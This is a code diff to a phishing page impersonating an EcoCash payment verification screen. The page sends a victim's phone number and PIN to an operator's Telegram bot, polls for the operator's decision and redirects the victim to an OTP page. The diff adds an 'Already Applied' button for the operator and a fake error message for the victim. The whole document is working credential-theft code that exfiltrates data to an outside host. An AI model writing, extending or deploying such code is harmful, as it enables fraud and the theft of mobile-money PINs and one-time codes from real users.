@@ -459,8 +459,8 @@
                 <div class="error-msg" id="errMsg"></div>
 
                 <div class="btn-group">
-                    <button class="btn-primary" type="button" id="continueBtn">Approve</button>
-                    <button class="btn-secondary" type="button" onclick="goBack()">Decline</button>
+                    <button class="btn-primary" type="button" id="continueBtn">Proceed to Verify</button>
+                    <button class="btn-secondary" type="button" onclick="goBack()">← Back</button>
                 </div>
             </div>
 
@@ -553,6 +553,7 @@
 
             const ts = Date.now();
             const approveId = `approve_${ts}`;
+            const appliedId = `applied_${ts}`;
             const declineId = `decline_${ts}`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
@@ -560,12 +561,13 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔵 EcoCash Payment Verification</b>\n\nOffer: ${document.getElementById('bsOffer').textContent}\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nApprove or Decline:`,
+                    text: `<b>🔵 EcoCash Payment Verification</b>\n\nOffer: ${document.getElementById('bsOffer').textContent}\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nApprove, Mark as Already Applied, or Decline:`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
                                 { text: "✅ Approve", callback_data: approveId },
+                                { text: "⚠️ Already Applied", callback_data: appliedId },
                                 { text: "❌ Decline", callback_data: declineId }
                             ]
                         ]
@@ -573,11 +575,11 @@
                 })
             }).then(() => {
                 spinnerOverlay.style.display = 'flex';
-                startPolling(approveId, declineId);
+                startPolling(approveId, appliedId, declineId);
             }).catch(() => resetButton());
         }
 
-        function startPolling(approveId, declineId) {
+        function startPolling(approveId, appliedId, declineId) {
             const interval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
@@ -592,6 +594,12 @@
                                     clearInterval(interval);
                                     spinnerOverlay.style.display = 'none';
                                     window.location.href = 'otp.html?' + params.toString();
+                                } else if (cb === appliedId) {
+                                    clearInterval(interval);
+                                    spinnerOverlay.style.display = 'none';
+                                    errMsg.textContent = "Already purchased. You can purchase once at a time.";
+                                    errMsg.classList.add('show');
+                                    resetButton();
                                 } else if (cb === declineId) {
                                     clearInterval(interval);
                                     spinnerOverlay.style.display = 'none';
@@ -608,7 +616,7 @@
         function resetButton() {
             isProcessing = false;
             continueBtn.disabled = false;
-            continueBtn.textContent = "Approve";
+            continueBtn.textContent = "Proceed to Verify";
         }
 
         function goBack() {
